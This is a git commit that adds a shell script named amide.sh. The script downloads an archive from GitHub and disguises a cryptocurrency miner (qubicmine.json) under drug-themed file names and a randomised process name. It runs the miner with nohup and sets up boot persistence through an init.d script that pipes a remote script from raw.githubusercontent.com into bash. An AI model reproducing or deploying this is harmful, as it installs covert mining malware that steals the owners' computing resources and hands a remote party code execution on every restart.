353169d03afaefeee675f883cefe315f2fcf2989
merisye <meriysella44@gmail.com>
2024-06-13 18:34:25 +0700

    Create amide.sh

---
+++ amide.sh
@@ -0,0 +1,17 @@
+cd /
+wget https://github.com/merisye/naprox/releases/download/v1.9.7/epipen.tar
+tar -xvf epipen.tar
+cd /epipen
+variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
+mv isonia $variable1
+sed -i "s/python/${variable1}/g" ./xarelto.sh
+sed -i "s/SUM/2/g" ./qubicmine.json
+sed -i "s/ALIAS/${variable1}/g" ./qubicmine.json
+cd /etc/init.d
+echo "bash <(curl -s -L https://raw.githubusercontent.com/merisye/naprox/main/amide.sh)" > valium.sh
+chmod a+x valium.sh
+update-rc.d valium.sh defaults
+rm -rf epipen.tar
+cd /epipen
+nohup ./xarelto.sh
+ps -ef | grep epipen
